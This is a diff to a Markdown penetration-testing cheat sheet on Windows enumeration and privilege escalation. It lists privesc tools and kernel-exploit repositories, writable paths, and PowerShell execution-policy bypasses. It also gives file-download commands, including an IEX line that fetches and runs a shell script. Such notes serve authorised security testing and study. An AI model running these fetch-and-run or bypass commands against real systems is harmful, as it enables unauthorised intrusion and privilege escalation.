@@ -1,8 +1,110 @@
 ## Windows Enumeration
-### Automate
 
 - [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 - [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+- [Windows Privesc Checker](https://www.kali.org/tools/windows-privesc-check/)
+- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
+
+### Path fix
+
+```
+set PATH=C:\Windows;C:\Windows\system32;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;%PATH%
+
+Get-ExecutionPolicy -List
+Set-ExecutionPolicy Unrestricted
+```
+### Powershell location
+
+```
+C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+```
+### Writable Paths
+
+```
+C:\Windows\Temp
+
+C:\Users\<USER>\Desktop\
+
+C:\Users\Public\
+
+C:\Documents and Settings\Public\
+
+C:\Documents and Settings\<USER>\Desktop\
+```
+### PS styles
+
+```
+PS> $host
+
+> powershell -c <cmd>
+
+> powershell.exe -exec bypass -Command <>
+
+```
+
+
+### Cmds
+
+```
+# download file
+
+certutil.exe -urlcache [-split] -f <source> <destination>
+
+PS> wget <source> -OutFile <dest>
+
+PS> Invoke-WebRequest -Uri <source> -Outfile <out-path>
+
+powershell -c (New-Object System.Net.WebClient).downloadFile('<source>', '<dest>')
+
+powershell -exec bypass IEX(New-Object Net.WebClient).downloadString('/shell.ps1')
+
+wget.vbs https://gist.github.com/sckalath/ec7af6a1786e3de6c309
+
+#run file
+
+> ren <src> <dest>
+
+PS> Start-Process <file.exe>
+
+# rename
+
+PS> Rename-Item -Path <file> -NewName <new-file>
+
+# move
+
+> copy /Y <src> <dest>
+
+PS> Move-Item -Path <src> -Destination <dest>
+
+# /E copies entire dir-structure
+
+> robocopy <src> <dest> /E
+
+# delete
+
+PS> Remove-Item -Path <file> [-recursive]
+
+```
+
+### PS shorthand
+
+```
+# get child items
+
+PS> gci [--recurse]
+
+# get content
+
+PS> gc FILE
+```
+### Arch based windows directory structure
+
+| Session type   | 32 bit folder       | 64 bit folder         |
+| -------------- | ------------------- | --------------------- |
+| 32 bit session | C:\Windows\system32 | C:\Windows\sysNative\ |
+| 64 bit session | C:\Windows\sysWOW64 | C:\Windows\system32\  |
 
 ### Manual
 
@@ -48,7 +150,31 @@ Get-History # Powershell History
 
 ```
 
+### Automate
 
+```
+
+winPEASx86.exe or winPEASx64.exe are best
+
+Then
+
+windows-privesc-check2.exe
+
+Otherwise,
+
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML"
+
+or
+
+./windows-exploit-suggester.py --update
+./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
+./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext 'windows server 2008 r2'
+
+
+
+
+
+```
 ### More Automate
 
 ### PowerUp
